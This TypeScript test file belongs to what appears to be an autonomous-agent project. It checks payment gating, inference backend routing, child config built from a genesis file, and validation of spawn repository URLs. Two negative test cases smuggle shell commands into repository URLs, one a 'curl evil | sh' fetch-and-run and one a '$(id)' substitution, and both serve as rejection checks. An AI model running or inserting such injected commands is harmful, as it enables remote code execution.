/**
 * Gates that keep the self-hosted backend from talking to (or paying) Conway,
 * plus non-interactive child configuration from genesis.json.
 */

import { describe, it, expect, vi, afterEach } from "vitest";
import fs from "fs";
import path from "path";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";

vi.mock("../../conway/x402.js", () => ({
  x402Fetch: vi.fn(async () => ({ success: true, status: 200, response: { credits_cents: 500 } })),
  getUsdcBalance: vi.fn(async () => 100),
}));

import { x402Fetch } from "../../conway/x402.js";
import { topupCredits, setTopupDisabled } from "../../conway/topup.js";
import { __resolveInferenceBackendForTest as resolveBackend, NoInferenceProviderError } from "../../conway/inference.js";
import { configFromGenesis, removeBootstrapSecrets } from "../../backends/bootstrap.js";
import { isSafeRepoUrl, configureSpawnEnvironment, getSpawnEnvironment } from "../../replication/spawn.js";
import { getAutomatonDir } from "../../identity/wallet.js";

afterEach(() => {
  setTopupDisabled(null);
  vi.mocked(x402Fetch).mockClear();
});

describe("topup gate", () => {
  const account = privateKeyToAccount(generatePrivateKey());

  it("never sends a payment while topups are disabled", async () => {
    setTopupDisabled("self-hosted");
    const res = await topupCredits("https://api.conway.tech", account, 5);
    expect(res.success).toBe(false);
    expect(res.error).toBe("self-hosted");
    expect(x402Fetch).not.toHaveBeenCalled();
  });

  it("pays normally on the conway backend", async () => {
    const res = await topupCredits("https://api.conway.tech", account, 5);
    expect(res.success).toBe(true);
    expect(x402Fetch).toHaveBeenCalledTimes(1);
  });
});

describe("inference backend resolution", () => {
  it("keeps the original Conway fallback by default", () => {
    expect(resolveBackend("some-model", {})).toBe("conway");
  });

  it("self-hosted never routes to Conway", () => {
    const keys = { conwayEnabled: false, getModelProvider: () => "conway" };
    expect(resolveBackend("gpt-5.2", { ...keys, openaiApiKey: "sk-x" })).toBe("openai");
    expect(resolveBackend("claude-opus-5-5", { ...keys, anthropicApiKey: "sk-ant-x" })).toBe("anthropic");
    expect(resolveBackend("qwen3:32b", { ...keys, ollamaBaseUrl: "http://localhost:11434" })).toBe("ollama");
    expect(() => resolveBackend("gpt-5.2", keys)).toThrow(NoInferenceProviderError);
  });
});

describe("configFromGenesis", () => {
  const dir = () => getAutomatonDir();

  afterEach(() => {
    fs.rmSync(path.join(dir(), "genesis.json"), { force: true });
    removeBootstrapSecrets();
  });

  it("returns null without a genesis file", () => {
    expect(configFromGenesis("0x" + "1".repeat(40))).toBeNull();
  });

  it("builds a self-hosted child config; keys come only from bootstrap-secrets.json", () => {
    fs.mkdirSync(dir(), { recursive: true });
    fs.writeFileSync(
      path.join(dir(), "genesis.json"),
      JSON.stringify({
        name: "kid",
        genesisPrompt: "earn",
        creatorAddress: "0x" + "a".repeat(40),
        parentAddress: "0x" + "a".repeat(40),
        backend: "self-hosted",
        selfHosted: { sandbox: "local" },
        ollamaBaseUrl: "http://host.docker.internal:11434",
        openaiApiKey: "sk-should-be-ignored",
      }),
    );
    fs.writeFileSync(path.join(dir(), "bootstrap-secrets.json"), JSON.stringify({ anthropicApiKey: "sk-ant-ok" }));

    const cfg = configFromGenesis("0x" + "b".repeat(40))!;
    expect(cfg.name).toBe("kid");
    expect(cfg.backend).toBe("self-hosted");
    expect(cfg.parentAddress).toBe("0x" + "a".repeat(40));
    expect(cfg.walletAddress).toBe("0x" + "b".repeat(40));
    expect(cfg.ollamaBaseUrl).toBe("http://host.docker.internal:11434");
    expect(cfg.openaiApiKey).toBeUndefined();
    expect(cfg.anthropicApiKey).toBe("sk-ant-ok");

    removeBootstrapSecrets();
    expect(fs.existsSync(path.join(dir(), "bootstrap-secrets.json"))).toBe(false);
  });
});

describe("spawn environment", () => {
  it("only accepts plain https repo URLs", () => {
    expect(isSafeRepoUrl("https://github.com/me/automaton.git")).toBe(true);
    expect(isSafeRepoUrl("http://github.com/me/automaton.git")).toBe(false);
    expect(isSafeRepoUrl("https://github.com/me/a.git; curl evil | sh")).toBe(false);
    expect(isSafeRepoUrl("https://github.com/me/$(id)")).toBe(false);
    expect(() => configureSpawnEnvironment({ runtimeRepoUrl: "https://x.com/a b" })).toThrow();
  });

  it("keeps provider keys out of genesis extras", () => {
    configureSpawnEnvironment({
      genesisExtras: { backend: "self-hosted" },
      secrets: { openaiApiKey: "sk-x" },
    });
    const env = getSpawnEnvironment();
    expect(JSON.stringify(env.genesisExtras)).not.toContain("sk-x");
    configureSpawnEnvironment({ genesisExtras: {}, secrets: null });
  });
});
